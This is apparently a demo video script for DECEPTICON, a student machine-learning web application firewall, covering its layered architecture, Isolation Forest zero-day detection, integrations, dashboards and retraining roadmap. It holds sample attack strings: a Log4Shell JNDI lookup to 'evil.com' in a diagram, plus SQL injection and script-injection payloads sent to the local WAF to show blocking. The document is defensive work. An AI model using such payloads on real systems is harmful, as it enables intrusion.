# DECEPTICON WAF - 5-Minute Video Demo Script

## 🎬 Video Overview

**Total Duration:** 5 minutes  
**Target Audience:** Security professionals, DevOps engineers, thesis reviewers  
**Prerequisites:** Docker running, dashboards pre-filled with data

---

## ⏱️ Timestamp Breakdown

| Time | Section | Duration |
|------|---------|----------|
| 0:00 - 0:45 | Introduction & Why DECEPTICON | 45 sec |
| 0:45 - 1:45 | Zero-Day Attack Handling | 60 sec |
| 1:45 - 2:15 | Open-Source WAF Integration | 30 sec |
| 2:15 - 3:15 | Docker Demo & Dashboard Tour | 60 sec |
| 3:15 - 3:45 | Data Flow & Environment Config | 30 sec |
| 3:45 - 4:15 | Feedback & Retraining Process | 30 sec |
| 4:15 - 5:00 | ML Models, Datasets & Future MLOps | 45 sec |

---

## 📝 FULL SCRIPT

---

### [0:00 - 0:45] Introduction & Why DECEPTICON is Better

**[SHOW: Terminal with project folder]**

> "Hi, I'm presenting DECEPTICON - a Machine Learning-powered Web Application Firewall that goes beyond traditional WAFs."

**[SHOW: Slide or diagram comparing Traditional vs ML WAF]**

> "Traditional WAFs like ModSecurity rely purely on **regex pattern matching** - they can only detect attacks they've seen before. This creates three major problems:"

> "**One** - High false positives. Legitimate requests containing words like 'SELECT' get blocked."

> "**Two** - Easy bypass. Attackers use encoding, case variation, or comment insertion to evade patterns."

> "**Three** - Zero protection against zero-day attacks."

**[SHOW: DECEPTICON architecture diagram]**

```mermaid
flowchart TB
    subgraph Client["🌐 Client"]
        C1["HTTP Request"]
    end

    subgraph DECEPTICON["🛡️ DECEPTICON WAF - 5 Layer Defense Architecture"]
        direction TB
        
        subgraph Layer1["🔍 Layer 1: Pattern Matching Engine"]
            L1A["Regex Pattern Database"]
            L1B["OWASP Core Rule Set"]
            L1C["Custom Signatures"]
            L1D{"Known Attack<br/>Pattern Match?"}
        end

        subgraph Layer2["🤖 Layer 2: XGBoost ML Classifier"]
            L2A["Feature Extraction<br/>• Token frequencies<br/>• Special char ratios<br/>• Payload structure"]
            L2B["XGBoost Model<br/>(Supervised Learning)"]
            L2C{"Confidence<br/>> 70%?"}
        end

        subgraph Layer3["👤 Layer 3: Behavioral Analysis"]
            L3A["Session Tracking"]
            L3B["Request Rate Analysis"]
            L3C["Bot Detection<br/>• User-Agent analysis<br/>• Request patterns<br/>• Timing analysis"]
            L3D{"Suspicious<br/>Behavior?"}
        end

        subgraph Layer4["🔮 Layer 4: Isolation Forest"]
            L4A["Anomaly Feature Extraction<br/>• URL entropy<br/>• Param count<br/>• Char distribution"]
            L4B["Isolation Forest Model<br/>(Unsupervised Learning)"]
            L4C{"Anomaly Score<br/>> Threshold?"}
        end

        subgraph Layer5["⚡ Layer 5: Zero-Day Detection"]
            L5A["Statistical Analysis"]
            L5B["Entropy Calculation"]
            L5C["N-gram Analysis"]
            L5D["Payload Structure<br/>Deviation Check"]
            L5E{"Statistical<br/>Anomaly?"}
        end

        subgraph Decision["🎯 Final Decision Engine"]
            DE1["Aggregate Scores"]
            DE2["Apply Weights"]
            DE3{"Combined Risk<br/>Score"}
            DE4["⛔ BLOCK<br/>Log Attack Details"]
            DE5["✅ ALLOW<br/>Forward Request"]
        end
    end

    subgraph Backend["🖥️ Backend Server"]
        B1["Application"]
    end

    subgraph Monitoring["📊 Observability Stack"]
        M1["Prometheus Metrics"]
        M2["Grafana Dashboards"]
        M3["Attack Logs"]
    end

    %% Flow
    C1 --> L1D
    
    L1A --> L1D
    L1B --> L1D
    L1C --> L1D
    
    L1D -->|"✓ Match"| DE1
    L1D -->|"✗ No Match"| L2A
    
    L2A --> L2B --> L2C
    L2C -->|"Attack Detected"| DE1
    L2C -->|"Uncertain/Benign"| L3A
    
    L3A --> L3B --> L3C --> L3D
    L3D -->|"Bot/Abuse"| DE1
    L3D -->|"Normal"| L4A
    
    L4A --> L4B --> L4C
    L4C -->|"Anomalous"| DE1
    L4C -->|"Normal"| L5A
    
    L5A --> L5B
    L5B --> L5C
    L5C --> L5D --> L5E
    L5E -->|"Zero-Day Risk"| DE1
    L5E -->|"Safe"| DE5
    
    DE1 --> DE2 --> DE3
    DE3 -->|"High Risk"| DE4
    DE3 -->|"Low Risk"| DE5
    
    DE5 --> B1
    DE4 --> M3
    
    DECEPTICON -.-> M1
    M1 --> M2

    %% Styling
    style Client fill:#e3f2fd,stroke:#1565c0
    style Layer1 fill:#ffecb3,stroke:#ff8f00
    style Layer2 fill:#c8e6c9,stroke:#2e7d32
    style Layer3 fill:#e1bee7,stroke:#7b1fa2
    style Layer4 fill:#b3e5fc,stroke:#0277bd
    style Layer5 fill:#ffcdd2,stroke:#c62828
    style Decision fill:#f5f5f5,stroke:#424242
    style Backend fill:#dcedc8,stroke:#558b2f
    style Monitoring fill:#fff3e0,stroke:#e65100
```

> "DECEPTICON solves this with a **5-layer defense architecture**:"
> - "Layer 1: Fast pattern matching for known attacks"
> - "Layer 2: XGBoost ML classifier for obfuscated attacks"
> - "Layer 3: Behavioral analysis and bot detection"  
> - "Layer 4: Isolation Forest for anomaly detection"
> - "Layer 5: Zero-day detection using statistical analysis"

> "The ML models provide **context-aware detection** - they understand attack semantics, not just patterns."

---

### [0:45 - 1:45] Zero-Day Attack Handling (60 seconds)

**[SHOW: Security Metrics Dashboard - Zero-Day panel]**

> "Let me explain how DECEPTICON handles zero-day attacks - threats that have never been seen before."

> "Traditional WAFs are **completely blind** to zero-days because their signature databases don't include them. By the time a signature is added, the damage is done."

**[SHOW: Diagram of Isolation Forest]**

```mermaid
flowchart TB
    subgraph Training["🎓 Training Phase"]
        direction TB
        T1[("Normal Traffic<br/>Dataset")] --> T2["Feature Extraction"]
        T2 --> T3["URL Length<br/>Param Count<br/>Entropy<br/>Char Distribution"]
        T3 --> T4["Build Isolation Trees"]
        T4 --> T5[("Trained<br/>Isolation Forest")]
    end

    subgraph Runtime["⚡ Runtime Detection"]
        direction TB
        R1["Incoming HTTP Request"] --> R2["Extract Features"]
        R2 --> R3["Traverse Isolation Trees"]
        R3 --> R4{"Path Length<br/>Analysis"}
        R4 -->|"Short Path<br/>(Easy to Isolate)"| R5["🔴 HIGH Anomaly Score<br/>(0.7 - 1.0)"]
        R4 -->|"Long Path<br/>(Hard to Isolate)"| R6["🟢 LOW Anomaly Score<br/>(0.0 - 0.3)"]
    end

    subgraph Decision["🎯 Decision Engine"]
        direction TB
        D1{"Anomaly Score<br/>> Threshold?"}
        D1 -->|"Yes"| D2["⛔ FLAG/BLOCK<br/>Potential Zero-Day"]
        D1 -->|"No"| D3["✅ ALLOW<br/>Normal Traffic"]
    end

    T5 -.->|"Model"| R3
    R5 --> D1
    R6 --> D1

    subgraph Example["📋 Example: Log4Shell Detection"]
        direction LR
        E1["${jndi:ldap://evil.com}"] --> E2["Unusual Characters: ${}"]
        E2 --> E3["High Entropy: 4.2 bits"]
        E3 --> E4["Anomaly Score: 0.89"]
        E4 --> E5["🔴 BLOCKED"]
    end

    style Training fill:#e1f5fe,stroke:#01579b
    style Runtime fill:#fff3e0,stroke:#e65100
    style Decision fill:#f3e5f5,stroke:#7b1fa2
    style Example fill:#ffebee,stroke:#c62828
```

> "DECEPTICON uses an **Isolation Forest algorithm** - an unsupervised machine learning model trained on normal traffic patterns."

> "Here's how it works:"

> "**Step 1**: During training, the model learns what 'normal' HTTP requests look like - typical URL lengths, parameter counts, character distributions, and entropy levels."

> "**Step 2**: At runtime, every request is scored based on how **anomalous** it is. The Isolation Forest assigns an anomaly score between 0 and 1."

> "**Step 3**: Requests with high anomaly scores - even if they don't match any known attack pattern - are flagged for review or blocked."

**[SHOW: Anomaly Score Histogram in Grafana]**

> "For example, when Log4Shell emerged in 2021, the `${jndi:ldap}` payload had **unusual character patterns** and **high entropy**. Our anomaly detector would flag it immediately - without any signature update."

> "This gives us **proactive protection** against novel attack vectors, supply chain attacks, and APT techniques."

---

### [1:45 - 2:15] Open-Source WAF Integration (30 seconds)

**[SHOW: Integration diagram]**

```mermaid
flowchart TB
    subgraph Standalone["🔷 Standalone Mode"]
        direction TB
        S1["Client Request"] --> S2["DECEPTICON WAF<br/>:8080"]
        S2 --> S3{"ML Analysis<br/>5 Layers"}
        S3 -->|"Blocked"| S4["⛔ 403 Forbidden"]
        S3 -->|"Allowed"| S5["Backend Server"]
        S5 --> S6["Response to Client"]
    end

    subgraph ModSecurity["🔶 ModSecurity Integration"]
        direction TB
        M1["Client Request"] --> M2["ModSecurity<br/>(Pattern Rules)"]
        M2 -->|"Pass to ML"| M3["DECEPTICON API<br/>/api/waf/analyze"]
        M3 --> M4{"ML Verdict"}
        M4 -->|"is_attack: true"| M5["ModSecurity Blocks"]
        M4 -->|"is_attack: false"| M6["Forward to App"]
        
        subgraph MSConfig["ModSecurity Rule"]
            MC1["SecRule TX:DECEPTICON_SCORE<br/>'@gt 0.7'<br/>'id:100001,deny,status:403'"]
        end
    end

    subgraph NGINX["🟢 NGINX + Lua Integration"]
        direction TB
        N1["Client Request"] --> N2["NGINX"]
        N2 --> N3["Lua Module<br/>access_by_lua"]
        N3 --> N4["HTTP Call to<br/>DECEPTICON:8080"]
        N4 --> N5{"Response"}
        N5 -->|"blocked: true"| N6["ngx.exit(403)"]
        N5 -->|"blocked: false"| N7["proxy_pass backend"]
    end

    subgraph CloudWAF["☁️ Cloud WAF Integration"]
        direction TB
        C1["AWS WAF / Cloudflare"] --> C2["Webhook to<br/>DECEPTICON API"]
        C2 --> C3["ML Analysis"]
        C3 --> C4["Return Verdict JSON"]
        C4 --> C5["Cloud WAF<br/>Applies Decision"]
    end

    subgraph API["📡 DECEPTICON REST API"]
        direction LR
        A1["POST /api/waf/analyze"]
        A2["Request Body:<br/>{method, path, payload,<br/>headers, ip}"]
        A3["Response:<br/>{is_attack, category,<br/>confidence, blocked}"]
        A1 --> A2 --> A3
    end

    style Standalone fill:#e3f2fd,stroke:#1565c0
    style ModSecurity fill:#fff8e1,stroke:#f57f17
    style NGINX fill:#e8f5e9,stroke:#2e7d32
    style CloudWAF fill:#fce4ec,stroke:#c2185b
    style API fill:#f3e5f5,stroke:#7b1fa2
```

> "DECEPTICON isn't meant to replace existing WAFs - it **enhances** them."

> "It can integrate with:"
> - "**ModSecurity** - as a pre-filter or post-analysis layer"
> - "**NGINX** - using the Lua module for inline analysis"
> - "**Apache** - via mod_proxy for request inspection"
> - "**Cloud WAFs** - AWS WAF, Cloudflare, through API webhooks"

> "The integration is simple - DECEPTICON exposes a REST API at `/api/waf/analyze`. Your existing WAF sends requests here, gets ML verdicts, and can make smarter blocking decisions."

> "This means you get **ML intelligence without replacing your infrastructure**."

---

### [2:15 - 3:15] Docker Demo & Dashboard Tour (60 seconds)

**[SHOW: Terminal]**

> "Let me show you DECEPTICON in action. Everything runs in Docker."

```powershell
# Show running containers
docker-compose ps
```

> "We have four services: the WAF engine, Redis for session storage, Prometheus for metrics, and Grafana for visualization."

```powershell
# Health check
curl http://localhost:8080/health
```

> "The WAF is healthy. Let me send some attacks."

```powershell
# SQL Injection attack
curl -X POST "http://localhost:8080/api/waf/analyze" -H "Content-Type: application/json" -d "{\"method\":\"GET\",\"path\":\"/api/users\",\"payload\":\"1 OR 1=1--\"}"
```

> "Blocked! The response shows: attack category SQL Injection, confidence 97%, blocked true."

**[SWITCH TO: Grafana - http://localhost:3000]**

> "Now let's see the dashboards."

**[SHOW: WAF Overview Dashboard]**

> "Dashboard 1 - **Security Overview**: Shows real-time requests per second, attack categories distribution, ML prediction latency under 5 milliseconds, and overall security score."

**[SHOW: Security Metrics Dashboard]**

> "Dashboard 2 - **Security Metrics**: Deep dive into threat intelligence - attack timeline, severity distribution, anomaly scores, zero-day detections, and bot traffic analysis."

**[SHOW: ML Performance Dashboard]**

> "Dashboard 3 - **ML Performance**: Model health monitoring - prediction accuracy at 96%, confidence score distributions, false positive/negative tracking, and latency heatmaps."

---

### [3:15 - 3:45] Data Flow & Environment Configuration (30 seconds)

**[SHOW: .env file]**

> "Let me explain the data flow and security configuration."

> "Requests flow through: **WAF Engine → Prometheus scrapes /metrics → Grafana queries Prometheus**"

> "In the environment file, every secret serves a purpose:"

> - "`REDIS_PASSWORD` - Protects session storage from unauthorized access"
> - "`SESSION_ENCRYPTION_KEY` - AES-256 encryption for session data at rest"
> - "`DECEPTICON_ADMIN_KEY_HASH` - SHA-256 hashed admin API key for secure management"
> - "`GRAFANA_PASSWORD` - Dashboard access control"
> - "`MODEL_SIGNING_KEY` - Cryptographic verification that ML models haven't been tampered with"

> "All secrets are generated using Python's cryptographically secure `secrets` module - never hardcoded."

---

### [3:45 - 4:15] Feedback & Retraining Process (30 seconds)

**[SHOW: Admin Feedback diagram or API]**

> "DECEPTICON implements **continuous learning** through an admin feedback loop."

> "When a security analyst identifies a false positive or false negative, they submit feedback via the API:"

```bash
POST /api/admin/feedback
{
  "request_id": "abc123",
  "actual_label": "benign",
  "feedback": "false_positive"
}
```

> "This feedback is stored and used for **model retraining**. The adaptive learning system:"

> 1. "Collects feedback samples"
> 2. "Validates against ground truth"
> 3. "Triggers retraining when accuracy drops below threshold"
> 4. "Performs A/B testing before promoting new models"

> "This creates a **self-improving system** that gets better over time with real-world data."

---

### [4:15 - 5:00] ML Models, Datasets & Future MLOps (45 seconds)

**[SHOW: Model architecture slide]**

> "Let me explain the ML choices we made."

> "**Why XGBoost for classification?**"
> - "Handles imbalanced data well - attacks are rare compared to normal traffic"
> - "Interpretable feature importance - we can explain why something was blocked"
> - "Fast inference - under 5ms per request"
> - "Robust against overfitting with proper regularization"

> "**Why Isolation Forest for anomaly detection?**"
> - "Unsupervised - doesn't need labeled attack data"
> - "Efficient on high-dimensional data"
> - "Perfect for zero-day detection where we don't know what attacks look like"

> "**Training Datasets:**"
> - "CSIC 2010 HTTP Dataset - 36,000 normal and 25,000 attack requests"
> - "Custom-generated payloads from OWASP testing guides"
> - "Real-world sanitized logs for behavioral patterns"

**[SHOW: MLOps Pipeline diagram]**

> "**Future Roadmap - MLOps Automation:**"

> "We're building an automated data pipeline that will:"
> - "Scrape **CVE databases** daily for new vulnerability patterns"
> - "Pull payloads from **ExploitDB** and **PacketStorm**"
> - "Auto-generate training samples from new attack signatures"
> - "Trigger model retraining with CI/CD pipelines"
> - "Deploy updated models with zero downtime using blue-green deployment"

> "This transforms DECEPTICON from a static tool into a **living defense system** that evolves with the threat landscape."

---

### [5:00] Closing

> "That's DECEPTICON - an ML-powered WAF that provides intelligent, adaptive protection against both known and unknown threats."

> "Thank you for watching."

---

## 🎬 RECORDING CHECKLIST

### Pre-Recording Setup (10 min before):

```powershell
# 1. Start containers
docker-compose up -d

# 2. Wait for health
Start-Sleep 30

# 3. Fill dashboards (run the ALL-IN-ONE script from VIDEO_DEMO_COMMANDS.md)
# This takes ~2-3 minutes

# 4. Verify
curl http://localhost:8080/health
docker-compose ps
```

### Open These Windows:
- [ ] Terminal (PowerShell) - for commands
- [ ] VS Code with .env file open
- [ ] Browser Tab 1: Grafana WAF Overview - http://localhost:3000/d/waf-overview
- [ ] Browser Tab 2: Grafana Security Metrics - http://localhost:3000/d/security-metrics  
- [ ] Browser Tab 3: Grafana ML Performance - http://localhost:3000/d/ml-performance
- [ ] Slides/Diagrams (optional)

### Grafana Settings:
- Time range: Last 15 minutes
- Refresh: 5 seconds
- Login: admin / (your GRAFANA_PASSWORD)

---

## 📊 COMMANDS TO RUN DURING VIDEO

### Health Check (2:15)
```powershell
docker-compose ps
curl.exe http://localhost:8080/health
```

### Attack Demo (2:30)
```powershell
# SQL Injection - BLOCKED
curl.exe -X POST "http://localhost:8080/api/waf/analyze" -H "Content-Type: application/json" -d "{\"method\":\"GET\",\"path\":\"/api/users\",\"payload\":\"1 OR 1=1--\"}"

# XSS - BLOCKED  
curl.exe -X POST "http://localhost:8080/api/waf/analyze" -H "Content-Type: application/json" -d "{\"method\":\"GET\",\"path\":\"/api/search\",\"payload\":\"<script>alert(1)</script>\"}"

# Normal Request - ALLOWED
curl.exe -X POST "http://localhost:8080/api/waf/analyze" -H "Content-Type: application/json" -d "{\"method\":\"GET\",\"path\":\"/api/products\",\"payload\":\"category=books\"}"
```

---

## 📋 KEY TALKING POINTS CHEAT SHEET

### Traditional WAF Problems:
- Regex-only = easy bypass
- High false positives
- No zero-day protection
- Static rules need constant updates

### DECEPTICON Advantages:
- 5-layer defense architecture
- ML-based context understanding
- Unsupervised anomaly detection
- Self-improving with feedback
- <5ms latency

### Zero-Day Handling:
- Isolation Forest (unsupervised)
- Learns "normal" patterns
- Flags statistical anomalies
- No signatures needed

### ML Model Choices:
- **XGBoost**: Fast, interpretable, handles imbalance
- **Isolation Forest**: Unsupervised, zero-day capable
- **ONNX format**: Cross-platform, optimized inference

### Datasets:
- CSIC 2010 (61,000 samples)
- OWASP payloads
- Custom-generated attacks

### Future MLOps:
- Auto-scrape CVE/ExploitDB
- CI/CD model retraining
- Blue-green deployment
- Continuous learning pipeline

---

## 🎯 PRESENTATION TIPS

1. **Speak slowly** - 5 minutes goes fast, but rushing sounds unprofessional
2. **Pause on dashboards** - Let viewers see the graphs
3. **Show real responses** - The JSON output proves it works
4. **Practice transitions** - Terminal → Browser → Terminal should be smooth
5. **Have backup commands** - In case of typos, have them ready to paste

---

*Good luck with your video! 🎬*
